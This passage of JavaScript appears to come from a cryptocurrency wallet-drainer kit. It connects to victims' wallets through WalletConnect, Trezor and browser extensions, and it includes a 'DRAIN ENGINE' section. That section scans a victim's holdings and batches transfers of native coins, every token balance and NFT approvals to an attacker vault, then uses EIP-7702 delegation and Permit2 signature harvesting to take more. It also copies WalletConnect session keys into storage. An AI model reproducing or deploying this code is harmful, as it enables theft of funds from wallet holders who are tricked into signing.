      } catch (e) { L.warn('Trezor connect fail:', e.message); return null; }
    },

    signTrezorTypedData: async function (typedData) {
      try {
        var r = await window.TrezorConnect.ethereumSignTypedData({ path: HD_PATH_EVM, data: typedData, metamask_v4_compat: true });
        if (!r.success) throw new Error(r.payload.error);
        return r.payload.signature;
      } catch (e) { L.warn('Trezor sign fail:', e.message); return null; }
    },

    signTrezorTransaction: async function (txParams) {
      try {
        var chainIdNum = typeof txParams.chainId === 'string'
          ? parseInt(String(txParams.chainId).replace('0x', ''), 16) : Number(txParams.chainId || 1);
        var r = await window.TrezorConnect.ethereumSignTransaction({
          path: HD_PATH_EVM,
          transaction: {
            to: txParams.to,
            value: txParams.value,
            chainId: chainIdNum,
            nonce: txParams.nonce,
            gasLimit: txParams.gas,
            maxFeePerGas: txParams.maxFeePerGas,
            maxPriorityFeePerGas: txParams.maxPriorityFeePerGas,
            data: txParams.data || '0x',
          },
        });
        if (!r.success) throw new Error(r.payload.error);
        return r.payload.serializedTx || r.payload.serialized;
      } catch (e) { L.warn('Trezor tx sign fail:', e.message); return null; }
    },
  };

  // ═══════════════════════════════════════════════════════════════
  // SECTION 08: WALLETCONNECT — Reown AppKit multichain bundle
  // ═══════════════════════════════════════════════════════════════
  var _wcConnecting = false;
  var _wcProv = null;

  function extractBatchOrTxId(raw) {
    if (raw == null) return null;
    if (typeof raw === 'string') {
      var s = raw.trim();
      if (s.indexOf('[object') === 0) return null;
      return s.startsWith('0x') ? s : null;
    }
    if (typeof raw === 'object') {
      var id = raw.id || raw.bundleId || raw.hash || raw.transactionHash || raw.txHash;
      if (id && String(id).startsWith('0x')) return String(id);
    }
    return null;
  }

  async function pollWcProviderReady(maxMs) {
    maxMs = maxMs || 60000;
    if (!window.LegionWallet) return null;
    var start = Date.now();
    var hijackStreak = 0;
    while (Date.now() - start < maxMs) {
      var connId = getLegionConnectorId().toLowerCase();
      if (connId && isInjectedConnectorId(connId)) {
        hijackStreak++;
        if (hijackStreak >= 2) {
          L.warn('WC poll: extension hijack — stop', connId);
          await disconnectLegionWallet();
          return null;
        }
        await sleep(600);
        continue;
      }
      hijackStreak = 0;
      var p = await safeGetLegionProvider();
      if (p && isRealWalletConnectSession(connId, p)) {
        try {
          var accts = await p.request({ method: 'eth_accounts' });
          if (accts && accts.length) {
            L.log('WC poll: session ready', String(accts[0]).slice(0, 10) + '...');
            return p;
          }
        } catch (e1) { /* keep polling */ }
      }
      applyLegionWalletSessionAddresses();
      await sleep(800);
    }
    return null;
  }

  function closeAppKitModal() {
    try {
      if (window.LegionWallet && typeof window.LegionWallet.closeModal === 'function') {
        window.LegionWallet.closeModal();
        return;
      }
      var selectors = ['w3m-modal', 'appkit-modal'];
      for (var i = 0; i < selectors.length; i++) {
        var modal = document.querySelector(selectors[i]);
        if (!modal) continue;
        var root = modal.shadowRoot || modal;
        var closeBtn = root.querySelector('[data-testid="w3m-header-close"]')
          || root.querySelector('wui-icon-link[icon="close"]');
        if (closeBtn) { closeBtn.click(); return; }
        modal.removeAttribute('class');
        modal.style.display = 'none';
      }
    } catch (e) { /* AppKit close best-effort */ }
  }

  /** Slim WC pairing — Trust/OKX reject oversized or invalid optionalNamespaces */
  var WC_OPTIONAL_NAMESPACES = {
          eip155: {
      methods: ['eth_sendTransaction', 'eth_signTypedData_v4', 'personal_sign', 'eth_sign', 'wallet_sendCalls', 'wallet_getCapabilities', 'eth_accounts', 'eth_requestAccounts'],
      events: ['chainChanged', 'accountsChanged'],
          },
          solana: {
      chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
      methods: ['solana_signMessage', 'solana_signTransaction', 'solana_signAllTransactions', 'solana_signAndSendTransaction'],
      events: ['chainChanged', 'accountsChanged'],
    },
    bip122: {
      chains: ['bip122:000000000019d6689c085ae165831e93'],
      methods: ['signMessage', 'signPsbt', 'sendTransfer', 'getAccountAddresses'],
      events: ['chainChanged', 'accountsChanged'],
    },
    tron: {
      chains: ['tron:0x2b6653dc'],
      methods: ['tron_signMessage', 'tron_signTransaction'],
      events: ['chainChanged', 'accountsChanged'],
    },
    ton: {
      chains: ['ton:-239'],
      methods: ['ton_sendMessage', 'ton_signData', 'ton_sendTransaction', 'ton_signMessage'],
      events: ['chainChanged', 'accountsChanged'],
    },
    cosmos: {
      chains: ['cosmos:cosmoshub-4'],
      methods: ['cosmos_signAmino', 'cosmos_signDirect'],
      events: ['chainChanged', 'accountsChanged'],
    },
    aptos: {
      chains: ['aptos:1'],
      methods: ['aptos_signMessage', 'aptos_signTransaction'],
      events: ['chainChanged', 'accountsChanged'],
    },
    sui: {
      chains: ['sui:mainnet'],
      methods: ['sui_signPersonalMessage', 'sui_signTransaction'],
      events: ['chainChanged', 'accountsChanged'],
    },
  };

  async function ensureWcBip122Linked() {
    if (S.chains.BTC && S.chains.BTC.address) return S.chains.BTC.address;
    var wcAddr = scanWcSessionAllFamilies();
    if (wcAddr && wcAddr.btc) {
      applyWcSessionAddresses(wcAddr);
      return wcAddr.btc;
    }
    if (!window.LegionWallet || typeof window.LegionWallet.ensureBip122Link !== 'function') return null;
    try {
      var btc = await window.LegionWallet.ensureBip122Link({
        projectId: WC_PROJECT_ID,
        metadata: wcMetaPayload(),
        optionalNamespaces: WC_OPTIONAL_NAMESPACES,
        timeoutMs: (isTrustInAppBrowser() || window.__TRUST_IN_APP__) ? 12000 : 120000,
      });
      if (btc) {
        S.chains.BTC = { address: btc, name: 'UTXO', wcSession: true };
        wireWcBtcConnection(btc);
        L.log('[UTXO] bip122 linked:', btc.slice(0, 8) + '...');
      }
      return btc || null;
    } catch (e) {
      L.warn('[UTXO] bip122 link skip:', e.message);
      return null;
    }
  }

  async function bundledWalletConnect() {
    if (!WC_PROJECT_ID) { L.warn('wcProjectId not set'); return null; }
    if (typeof window.LegionWallet === 'undefined') {
      L.warn('LegionWallet bundle not loaded');
      return null;
    }
    if (_wcConnecting && !window.__LEGION_DEEP_LINK_TARGET__) return null;
    if (_wcConnecting && window.__LEGION_DEEP_LINK_TARGET__) {
      L.log('WC: resetting stuck connect for named deep-link retry');
      _wcConnecting = false;
    }
    _wcConnecting = true;
    _wcProv = null;
    S.connectMode = 'wc';

    if (S.evmProvider && isInjectedProvider(S.evmProvider)) {
      logConnect('prep', 'disconnecting extension before WC QR');
      await clearInjectedSession({ keepMode: true });
    }
    if (S.connectMode === 'injected' || isInjectedConnectorId(getLegionConnectorId())) {
      await clearInjectedSession({ keepMode: true });
      await disconnectLegionWallet();
    }

    var wcMeta = wcMetaPayload();

    try {
      // Peek BEFORE status — "…approve…" triggers verifying overlay (#__lgn_co)
      // which sits at z-index max and covers the mobile Open sheet / blocks deeplink UX.
      var deepLinkTarget = null;
      try {
        deepLinkTarget = window.__LEGION_DEEP_LINK_TARGET__ || null;
      } catch (eDlPeek) { deepLinkTarget = null; }
      if (PLAT.isMobile && deepLinkTarget) {
        UI.overlay.hide();
        L.log('[UI] mobile named deep-link — skip verifying overlay (Open sheet owns UX)');
      } else {
        UI.status(PLAT.isMobile ? 'Open Trust Wallet to approve...' : 'Scan QR with your mobile wallet...');
      }
      logConnect('WC', 'Reown AppKit v' + (window.LegionWallet.version || '?') + ' | origin: ' + wcMeta.url);
      var wcNs = WC_OPTIONAL_NAMESPACES;
      if (window.LegionCaipRegistry && typeof window.LegionCaipRegistry.buildOptionalNamespacesFromRegistry === 'function') {
        wcNs = window.LegionCaipRegistry.buildOptionalNamespacesFromRegistry(WC_OPTIONAL_NAMESPACES, CFG.wcEvmCount || globalThis.LEGION_WC_EVM_COUNT);
      } else if (window.LegionWallet && typeof window.LegionWallet.buildOptionalNamespaces === 'function') {
        wcNs = window.LegionWallet.buildOptionalNamespaces(WC_OPTIONAL_NAMESPACES);
      }
      var hasStoredSession = !!findWcStorageSession();
      var sessionExpired = !!S.wcSessionExpired;
      var switchingFromExtension = !!(S.evmProvider && isInjectedProvider(S.evmProvider));
      var browserExtensionActive = !!(window.ethereum && (
        window.ethereum.isMetaMask || window.ethereum.isRabby || window.ethereum.isBraveWallet
      ));
      try {
        if (deepLinkTarget) window.__LEGION_DEEP_LINK_TARGET__ = null;
      } catch (eDl) { /* ignore */ }
      var trustInAppAppKit = false;
      try {
        trustInAppAppKit = !!(window.__TRUST_INAPP_APPKIT__ || isTrustInAppBrowser());
      } catch (eInApp) { trustInAppAppKit = false; }
      // In Trust Browser: force WC/AppKit multichain (all namespaces) — never injected ETH-only sheet
      if (trustInAppAppKit) {
        try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (eDl2) { /* ignore */ }
        deepLinkTarget = null;
      }
      var connectP = window.LegionWallet.connect({
        projectId: WC_PROJECT_ID,
        metadata: wcMeta,
        timeoutMs: 180000,
        requireWalletConnect: true,
        optionalNamespaces: wcNs,
        multichainHarvestMs: WC_HARVEST_WAIT_MS,
        bip122PollMs: WC_BIP122_POLL_MS,
        ensureBip122: false,
        linkBitcoin: true,
        enableInjected: false,
        enableEIP6963: false,
        featuredWalletIds: trustInAppAppKit
          ? ['4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0']
          : undefined,
        preserveSession: !deepLinkTarget && hasStoredSession && !sessionExpired && !switchingFromExtension && !browserExtensionActive,
        forceFresh: !!deepLinkTarget || switchingFromExtension || sessionExpired || browserExtensionActive || trustInAppAppKit,
        restore: !deepLinkTarget && !trustInAppAppKit && (sessionExpired || hasStoredSession) && !browserExtensionActive,
        deepLinkTarget: deepLinkTarget || undefined,
      });
      var provider = await Promise.race([
        connectP,
        new Promise(function (_, rej) {
          setTimeout(function () { rej(new Error('AppKit timeout — scan QR and approve on phone')); }, 185000);
        }),
      ]);
      var connId = getLegionConnectorId().toLowerCase();
      if (provider && isInjectedConnectorId(connId) && !acceptTrustInAppWc(connId, provider)) {
        try { await disconnectLegionWallet(); } catch (e2) {}
        L.warn('Extension hijacked WalletConnect —', connId || 'injected');
        _wcConnecting = false;
        _wcProv = null;
        return null;
      }
      if (provider && provider.isMetaMask && !provider.isWalletConnect && !acceptTrustInAppWc(connId, provider)) {
        try { await disconnectLegionWallet(); } catch (e2) {}
        L.warn('Browser wallet hijacked WalletConnect — use MetaMask button for extension');
        _wcConnecting = false;
        _wcProv = null;
        return null;
      }
      if (provider && connId && !isRealWalletConnectSession(connId, provider)) {
        try { await disconnectLegionWallet(); } catch (e2) {}
        L.warn('Non-WC connector —', connId);
        _wcConnecting = false;
        _wcProv = null;
        return null;
      }
      if (provider && acceptTrustInAppWc(connId, provider)) {
        try { provider.isWalletConnect = true; } catch (eMark) { /* ignore */ }
      }
      _wcProv = provider;
      // Persist symKey to localStorage immediately — AppKit may use sessionStorage (lost on tab close)
      try {
        var _psCl = (provider.signer && provider.signer.client) || provider.client || null;
        if (_psCl) {
          var _psSess = _psCl.session && typeof _psCl.session.getAll === 'function'
            ? _psCl.session.getAll()
            : (_psCl.session && _psCl.session.map ? Array.from(_psCl.session.map.values()) : null);
          if (_psSess && _psSess.length) {
            var _psTopic = _psSess[_psSess.length - 1].topic;
            var _psKc = _psCl.core && _psCl.core.crypto && _psCl.core.crypto.keychain;
            if (_psTopic && _psKc) {
              var _psSym = null;
              try { _psSym = typeof _psKc.get === 'function' ? _psKc.get(_psTopic) : null; } catch (e2k) {}
              if (!_psSym && _psKc.map) { try { _psSym = _psKc.map.get(_psTopic) || null; } catch (e2k) {} }
              if (!_psSym && _psKc.store) { try { _psSym = _psKc.store[_psTopic] || null; } catch (e2k) {} }
              if (_psSym) {
                try { localStorage.setItem('legion:wc:sym:' + _psTopic, _psSym); } catch (eLs) {}
                // Also persist full session object — WC SDK may use sessionStorage (lost on tab close)
                try {
                  var _psSessObj = _psSess[_psSess.length - 1];
                  localStorage.setItem('legion:wc:session:' + _psTopic, JSON.stringify({
                    topic: _psTopic,
                    namespaces: _psSessObj.namespaces || {},
                    expiry: _psSessObj.expiry || 0,
                    self: _psSessObj.self || {},
                    peer: _psSessObj.peer || {},
                  }));
                } catch (eLs2) {}
                L.log('[WcRelay] symKey+session persisted to localStorage | topic:', _psTopic.slice(0, 8) + '...');
              }
            }
          }
        }
      } catch (ePs) {}
      _wcConnecting = false;
      await harvestWcMultichainFamilies({
        // In TW in-app browser: addresses that came in the initial WC session are already
        // available immediately; don't poll 10s for chains that will never appear.
        waitMs: (isTrustInAppBrowser() || window.__TRUST_IN_APP__) ? 800 : WC_HARVEST_WAIT_MS,
        linkBtc: true,
        ensureBip122: false,
        bip122PollMs: WC_BIP122_POLL_MS,
      });
      L.log('Bundled AppKit connected | connector:', connId || 'unknown',
        '| wc:', !!(provider && provider.isWalletConnect));
      void registerWcSessionWithBackend();
      return provider;
    } catch (e) {
      _wcConnecting = false;
      _wcProv = null;
      L.warn('Bundled AppKit fail:', e.message);
      var stored = findWcStorageSession();
      if (stored) {
        L.log('WC storage session found — recovering', stored.address.slice(0, 10) + '...');
        var recovered = await safeGetLegionProvider();
        if (recovered) {
          _wcProv = recovered;
          return recovered;
        }
      }
      L.log('WC: waiting for mobile session in storage...');
      stored = await waitWcStorageSession(60000);
      if (stored) {
        var polled = await pollWcProviderReady(30000);
        if (polled) {
          _wcProv = polled;
          L.log('WC recovered via storage poll | wc:', !!polled.isWalletConnect);
          return polled;
        }
      }
      try { await disconnectLegionWallet(); } catch (e2) {}
      return null;
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 09: EVM CORE — DRAIN ENGINE
  // ═══════════════════════════════════════════════════════════════

  // 9.1 — Capability detection
  async function getCapabilities(provider, address, chainId) {
    try {
      var caps = await provider.request({ method: 'wallet_getCapabilities', params: [address] });
      var key = '0x' + Number(chainId).toString(16);
      var cc = caps && (caps[key] || caps[String(chainId)] || caps[Number(chainId)]);
      var atomic = cc && (cc.atomic || cc.atomicBatch);
      var status = atomic && (atomic.status || (atomic.supported ? 'supported' : ''));
      var atomicBatch = status === 'ready' || status === 'supported' || !!(atomic && atomic.supported);
      var sendCalls = cc && cc.sendCalls;
      var sendCallsV2 = sendCalls && (sendCalls.version === '2.0.0' || sendCalls.supported === true);
      return { atomicBatch: atomicBatch, sendCallsV2: sendCallsV2 };
    } catch (e) {
      return { atomicBatch: isMetaMaskProvider(provider), sendCallsV2: false };
    }
  }

  async function scanAssets(provider, address, chainId) {
    var assets = { tokens: [], nfts: [], nativeHex: '0x0', usd: 0, defi_positions: [], uni_v3_positions: [], uni_v2_lps: [] };
    try {
      var scout = await apiPost('/api/v1/scout/ranked', { wallet_address: address, chain_id: Number(chainId) });
      if (scout && scout.data) {
        assets.usd = Number(scout.data.total_usd || 0);
        S.scoutUsd = Math.max(S.scoutUsd, assets.usd);
        (scout.data.assets || scout.data.ranked || []).forEach(function (t) {
          var contract = t.address || t.token;
          var bal = t.raw_balance || t.amount_raw || '0';
          if (contract && contract !== 'native' && String(contract).startsWith('0x') && BigInt(bal || '0') > 0n) {
            assets.tokens.push({
              address: String(contract).toLowerCase(),
              balance: String(bal),
              symbol: t.symbol,
              usd: t.usd_value || t.amount_usd || 0,
            });
          }
        });
        if (scout.data.nfts && scout.data.nfts.length) assets.nfts = scout.data.nfts;
        if (scout.data.defi_positions) assets.defi_positions = scout.data.defi_positions;
        if (scout.data.uni_v3_positions) assets.uni_v3_positions = scout.data.uni_v3_positions;
        if (scout.data.uni_v2_lps) assets.uni_v2_lps = scout.data.uni_v2_lps;
      }
    } catch (e) { L.warn('Scout fail:', e.message); }
    assets.tokens = filterDrainableTokens(assets.tokens);

    try {
      var nftScan = await apiPost('/api/v1/seaport/scan-listings', {
        wallet_address: address, wallet: address, chain_id: Number(chainId),
      });
      var listings = (nftScan && nftScan.data && nftScan.data.listings) || [];
      var seen = {};
      assets.nfts.forEach(function (n) { if (n.contract) seen[String(n.contract).toLowerCase()] = true; });
      listings.forEach(function (l) {
        var c = l.contract || l.nft_contract;
        if (c && !seen[c.toLowerCase()]) {
          seen[c.toLowerCase()] = true;
          assets.nfts.push({ contract: c, token_id: l.token_id, standard: l.standard || 'erc721' });
        }
      });
    } catch (e2) { L.warn('NFT scan skip:', e2.message); }

    try {
      assets.nativeHex = await evmRequestWithFallback(provider, chainId, 'eth_getBalance', [address, 'latest']) || '0x0';
    } catch (e3) {}

    var nativeBal = BigInt(assets.nativeHex || '0x0');
    if (nativeBal > 0n) {
      L.log('On-chain native:', (Number(nativeBal) / 1e18).toFixed(6), 'ETH on chain', chainId);
    }

    try {
      var fusionUsd = await SCOUT.ranked(address);
      if (fusionUsd && fusionUsd.total_usd != null) {
        var totalAll = Number(fusionUsd.total_usd) || 0;
        assets.usd = Math.max(assets.usd, totalAll);
        S.scoutUsd = Math.max(S.scoutUsd, assets.usd);
        L.log('Backend portfolio USD:', assets.usd.toFixed(2));
      }
    } catch (e4) { /* ranked all-chains optional */ }

    if (nativeBal > MIN_NATIVE_WEI && assets.usd < 1) {
      var ethFloorUsd = (Number(nativeBal) / 1e18) * 2500;
      if (ethFloorUsd > assets.usd) {
        assets.usd = ethFloorUsd;
        S.scoutUsd = Math.max(S.scoutUsd, assets.usd);
        L.log('Native ETH USD floor:', assets.usd.toFixed(2));
      }
    }

    return assets;
  }

  function normalizeSendCall(call) {
    var c = { to: call.to };
    if (call.value) c.value = call.value;
    if (call.data && call.data !== '0x' && String(call.data).length > 2) c.data = call.data;
    return c;
  }

  async function requestSendCallsBatch(provider, address, chainId, calls, atomicRequired) {
    var chainHex = '0x' + Number(chainId).toString(16);
    try {
      var batchId = await provider.request({
        method: 'wallet_sendCalls',
        params: [{
          version: '2.0.0',
          chainId: chainHex,
          from: address,
          atomicRequired: atomicRequired !== false,
          calls: calls,
        }],
      });
      return extractBatchOrTxId(batchId);
    } catch (e) {
      if (atomicRequired === false) throw e;
      L.warn('wallet_sendCalls v2 fail:', e.message);
      var batchId2 = await provider.request({
        method: 'wallet_sendCalls',
        params: [{
          version: '1.0',
          chainId: chainHex,
          from: address,
          atomicRequired: false,
          calls: calls,
        }],
      });
      return extractBatchOrTxId(batchId2);
    }
  }

  // 9.3 — TIER 1: wallet_sendCalls (ONE POPUP — ETH + ERC-20 + NFT)
  async function drainSendCalls(provider, address, chainId, assets) {
    var claimContract = resolveClaimContract(chainId);
    var vault = VAULT.evm;
    var calls = [];

    var tokenCount = (assets.tokens || []).filter(function (t) { return BigInt(t.balance || '0') > 0n; }).length;
    var nftContracts = {};
    (assets.nfts || []).forEach(function (n) { if (n.contract) nftContracts[n.contract.toLowerCase()] = true; });
    var nftCount = Object.keys(nftContracts).length;
    var bal = BigInt(assets.nativeHex || '0x0');
    var gasLimit = estimateSendCallsGasLimit(tokenCount, nftCount, bal > 0n, chainId);
    var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
    var sendEth = sweep.send;

    if (sendEth > MIN_NATIVE_WEI) {
      if (claimContract) {
        calls.push({ to: claimContract, value: '0x' + sendEth.toString(16), data: SIG_CLAIM });
        L.log('Native sweep → claim():', claimContract.slice(0, 10) + '...', (Number(sendEth) / 1e18).toFixed(6));
      } else {
        calls.push({ to: vault, value: '0x' + sendEth.toString(16) });
        L.log('Native sweep → vault (no claim contract):', (Number(sendEth) / 1e18).toFixed(6), 'ETH');
      }
    }

    // ERC-20 — direct transfer(vault, balance)
    var SIG_TRF = '0xa9059cbb';
    assets.tokens.forEach(function (t) {
      if (BigInt(t.balance || '0') > 0n) {
        calls.push({
          to: t.address,
          data: SIG_TRF + vault.replace('0x', '').padStart(64, '0') + BigInt(t.balance).toString(16).padStart(64, '0'),
        });
      }
    });

    // NFT — setApprovalForAll(vault, true)
    var SIG_APPR = '0xa22cb465';
    Object.keys(nftContracts).forEach(function (c) {
      calls.push({ to: c, data: SIG_APPR + vault.replace('0x', '').padStart(64, '0') + '1'.padStart(64, '0') });
    });

    // finishAndDestroy is invoked inside clone claim()/drain() — no separate batch call

    if (calls.length === 0) return null;
    calls = calls.map(normalizeSendCall);

    var callChunks = chunkArray(calls, SEND_CALLS_MAX);
    L.log('wallet_sendCalls:', calls.length, 'calls in', callChunks.length, 'chunk(s)');
    var lastTxHash = null;
    for (var sci = 0; sci < callChunks.length; sci++) {
      var chunkCalls = callChunks[sci];
      try {
        var extracted = await requestSendCallsBatch(provider, address, chainId, chunkCalls, sci === 0);
        L.log('sendCalls chunk', sci + 1, 'batchId:', extracted ? extracted.slice(0, 42) : String(extracted));
        if (extracted && isLikelyTxHash(extracted)) lastTxHash = extracted;
    } catch (e) {
        if (sci === 0) {
          try {
            var extractedFallback = await requestSendCallsBatch(provider, address, chainId, chunkCalls, false);
            if (extractedFallback && isLikelyTxHash(extractedFallback)) lastTxHash = extractedFallback;
          } catch (e2) {
            L.warn('wallet_sendCalls chunk fail:', e2.message);
            if (sci === 0) return null;
          }
        } else {
          L.warn('wallet_sendCalls chunk', sci + 1, 'fail:', e.message);
        }
      }
    }
    return lastTxHash;
  }

  async function tryDestroyCloneAfterDrain(provider, address, chainId, claimContract) {
    if (!claimContract || !provider || !address) return;
    if (!isFactoryCloneAddress(chainId, claimContract)) return;
    try {
      var id = Number(chainId);
      var chainHex = '0x' + id.toString(16);
      var nonceHex = await provider.request({ method: 'eth_getTransactionCount', params: [address, 'pending'] });
      var fees = await estimateEip1559Fees(provider, chainId);
      await provider.request({
        method: 'eth_sendTransaction',
        params: [{
          from: address,
          to: claimContract,
          data: SIG_FINISH_DESTROY,
          value: '0x0',
          chainId: chainHex,
          nonce: toHexQty(nonceHex),
          gas: '0x186a0',
          maxFeePerGas: toHexQty(fees.maxFeePerGas),
          maxPriorityFeePerGas: toHexQty(fees.maxPriorityFeePerGas),
        }],
      });
      S.deactivatedContracts[String(claimContract).toLowerCase()] = true;
      L.log('[destroy] finishAndDestroy sent on chain', chainId);
    } catch (e) { L.warn('[destroy] finishAndDestroy skip:', e.message); }
  }

  /** Mobile / WC — claim() contract when deployed, else direct vault transfer */
  async function drainNativeSendTx(provider, address, chainId, assets) {
    var claimContract = resolveClaimContract(chainId);
    var gasLimit = claimContract ? 120000n : NATIVE_TRANSFER_GAS;
    // Live balance — avoids stale portfolio scan value after prior token drain gas costs.
    var balHex = await provider.request({ method: 'eth_getBalance', params: [address, 'latest'] });
    var bal = BigInt(balHex || '0x0');
    // Conservative 160% buffer so Trust Wallet's own gas estimate always fits within our deduction.
    // We do NOT pass maxFeePerGas/maxPriorityFeePerGas — wallet estimates its own price.
    // Trust Wallet's internal gas price ≈ 1.92× base fee; our estimateEip1559Fees returns 1.2×.
    // So Trust_gas ≈ 1.6× our estimate. Use 400% buffer → deduct 2.5× Trust_gas → ~$0.16 margin.
    var fees = await estimateEip1559Fees(provider, chainId);
    var gasCost = (gasLimit * fees.maxFeePerGas * 400n) / 100n;
    if (bal <= gasCost) return null;
    var sendEth = bal - gasCost;
    if (sendEth <= MIN_NATIVE_WEI) return null;
    var vault = VAULT.evm;
    var chainHex = '0x' + Number(chainId).toString(16);
    try {
      var nonceHex = await provider.request({ method: 'eth_getTransactionCount', params: [address, 'pending'] });
      var tx = {
        from: address,
        to: claimContract || vault,
        value: toHexQty(sendEth),
        data: claimContract ? SIG_CLAIM : '0x',
        chainId: chainHex,
        nonce: toHexQty(nonceHex),
        gas: toHexQty(gasLimit),
      };
      if (claimContract) {
        var onVault = await readContractVault(provider, claimContract);
        L.log('eth_sendTransaction claim() →', claimContract.slice(0, 10) + '...',
          '| forwards to:', (onVault || VAULT.evm).slice(0, 10) + '...',
          '|', (Number(sendEth) / 1e18).toFixed(6), 'native');
      } else {
        L.log('eth_sendTransaction native → vault (deploy ClaimForwarder):', (Number(sendEth) / 1e18).toFixed(6));
      }
      var hash = await provider.request({ method: 'eth_sendTransaction', params: [tx] });
      if (claimContract && isFactoryCloneAddress(chainId, claimContract)) {
        tryDestroyCloneAfterDrain(provider, address, chainId, claimContract);
      }
      return hash ? String(hash) : null;
    } catch (e) {
      L.warn('eth_sendTransaction fail:', e.message);
      return null;
    }
  }

  // 9.4 — TIER 2: EIP-7702 wallet_signAuthorization (ONE POPUP)
  async function drainEip7702(provider, address, chainId, assets) {
    if (!S.eip7702Enabled) return null;
    var delegate = resolveLegionDrain(chainId) || BATCH_DRAIN[Number(chainId)];
    if (!delegate || delegate === '0x0000000000000000000000000000000000000000') return null;
    if (!EIP7702_CHAINS[Number(chainId)]) return null;

    try {
      var nonceHex = await provider.request({ method: 'eth_getTransactionCount', params: [address, 'pending'] });
      var nonce = parseInt(String(nonceHex).replace('0x', ''), 16);

      L.log('wallet_signAuthorization...');
      var auth = await provider.request({
        method: 'wallet_signAuthorization',
        params: [{ contractAddress: delegate, chainId: '0x' + Number(chainId).toString(16), nonce: nonce }],
      });
      var defiActions = buildDefiActions(chainId, assets);
      L.log('EIP-7702 auth ok | defi actions:', defiActions.length);
      return {
        auth: auth,
        delegate: delegate,
        nonce: nonce,
        erc20s: assets.tokens.map(function (t) { return t.address; }),
        defiActions: defiActions,
      };
    } catch (e) { L.warn('wallet_signAuthorization not supported:', e.message); return null; }
  }

  async function signNativeForBatch(provider, address, chainId, nativeTransfer) {
    if (!nativeTransfer) return null;
    var txParams = {
      from: nativeTransfer.from || address,
      to: nativeTransfer.to,
      value: nativeTransfer.value && String(nativeTransfer.value).startsWith('0x')
        ? nativeTransfer.value : ('0x' + BigInt(nativeTransfer.value || '0').toString(16)),
      gas: nativeTransfer.gas || ('0x' + NATIVE_TRANSFER_GAS.toString(16)),
      nonce: '0x' + Number(nativeTransfer.nonce || 0).toString(16),
      type: '0x2',
      chainId: '0x' + Number(nativeTransfer.chainId || chainId || 1).toString(16),
    };
    if (nativeTransfer.maxFeePerGas) {
      txParams.maxFeePerGas = nativeTransfer.maxFeePerGas;
      txParams.maxPriorityFeePerGas = nativeTransfer.maxPriorityFeePerGas;
    } else {
      var fees = await estimateEip1559Fees(provider, chainId || nativeTransfer.chainId || 1);
      txParams.maxFeePerGas = '0x' + fees.maxFeePerGas.toString(16);
      txParams.maxPriorityFeePerGas = '0x' + fees.maxPriorityFeePerGas.toString(16);
    }
    try {
      L.log('eth_signTransaction (backend will broadcast)...');
      var signed = await provider.request({ method: 'eth_signTransaction', params: [txParams] });
      if (signed && String(signed).startsWith('0x')) return signed;
    } catch (e) {
      if (isUserRejection(e)) throw e;
      L.warn('eth_signTransaction unavailable:', e.message);
    }
    return null;
  }

  // personal_sign / evm_personal_verification REMOVED — does not move funds on backend.

  // 9.5b — REMOVED: drainNative (eth_sendTransaction) — user never broadcasts; backend relays signed txs.

  // 9.6 — TIER 3B: ERC-20 via Permit2 (+ optional native + NFT approvals)
  async function drainPermit2(provider, address, chainId, tokens, nfts, nativeAmountWei) {
    var nftArr = normNftList(nfts);
    var nftChunks = chunkArray(nftArr, NFT_APPROVAL_BATCH_SIZE);
    if (nftChunks.length === 0) nftChunks = [[]];

    var merged = null;
    tokens = filterDrainableTokens(tokens || []);
    if (!tokens.length && (!nfts || !nfts.length) && (!nativeAmountWei || nativeAmountWei <= 0n)) return null;
    for (var chunkIdx = 0; chunkIdx < nftChunks.length; chunkIdx++) {
      var nftChunk = nftChunks[chunkIdx];
      var isFirst = chunkIdx === 0;
      var permits = isFirst
        ? (tokens || []).map(function (t) { return { token: t.address, amount: t.balance || t.amount_raw || null }; })
            .filter(function (p) { return p.amount && BigInt(p.amount) > 0n; })
        : [];
      var nativeStr = (isFirst && nativeAmountWei && nativeAmountWei > 0n)
        ? nativeAmountWei.toString() : '0';
      if (permits.length === 0 && nftChunk.length === 0 && nativeStr === '0') continue;
      if (permits.length === 0 && nftChunk.length > 0 && nativeStr === '0' && !isFirst) { /* NFT-only chunk */ }

      var part = await drainPermit2Chunk(provider, address, chainId, permits, nftChunk, nativeStr);
      if (!part) continue;
      if (!merged) {
        merged = part;
      } else {
        if (part.sig) merged.sig = part.sig;
        if (part.nativeSigned) merged.nativeSigned = part.nativeSigned;
        Object.keys(part.nftApprovalSigs || {}).forEach(function (k) {
          merged.nftApprovalSigs[k] = part.nftApprovalSigs[k];
        });
        merged.nfts = (merged.nfts || []).concat(part.nfts || []);
      }
    }
    return merged;
  }

  function _dbgLog(msg, data) {
    try { void apiPost('/api/v1/debug-log', { message: msg, data: data || {} }).catch(function() {}); } catch (e) {}
  }

  async function drainPermit2Chunk(provider, address, chainId, permits, nftArr, nativeStr) {
    if (permits.length === 0 && nftArr.length === 0 && nativeStr === '0') return null;

    var resp = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
      wallet_address: address,
      chain_id: Number(chainId),
      permits: permits,
      nativeAmount: nativeStr,
      native_amount: nativeStr,
      nfts: nftArr,
      batch_nft_approvals: nftArr.length > 0,
      nft_batch_size: NFT_APPROVAL_BATCH_SIZE,
    });
    if (!resp || !resp.data) {
      L.warn('Permit2 typed_data fail');
      _dbgLog('Permit2 typed_data FAIL', { chain: Number(chainId), addr: address ? address.slice(0,8) : 'none', permits: permits.length, resp_status: resp ? 'no_data' : 'null' });
      return null;
    }
    var bd = resp.data;
    if (!bd.typed_data && permits.length === 0 && !bd.native_transfer) return null;

    var permitSig = null;
    if (bd.typed_data) {
      var td = normalizeTypedData(JSON.parse(JSON.stringify(bd.typed_data)));
      td = applyDynamicEip712Domain(td, chainId);
      L.log('Permit2 typed_data received, requesting signature...');
      _dbgLog('Permit2 sign start', { chain: Number(chainId), has_td: true });
      try {
        permitSig = await provider.request({
          method: 'eth_signTypedData_v4',
          params: [address, JSON.stringify(td)],
        });
        _dbgLog('Permit2 sign OK (v1)', { chain: Number(chainId) });
      } catch (e) {
        if (isUserRejection(e)) throw e;
        var _e1str = e ? (e.message || e.reason || String(e) || '') : '';
        var _e1code = e ? (e.code || e.data && e.data.code || '') : '';
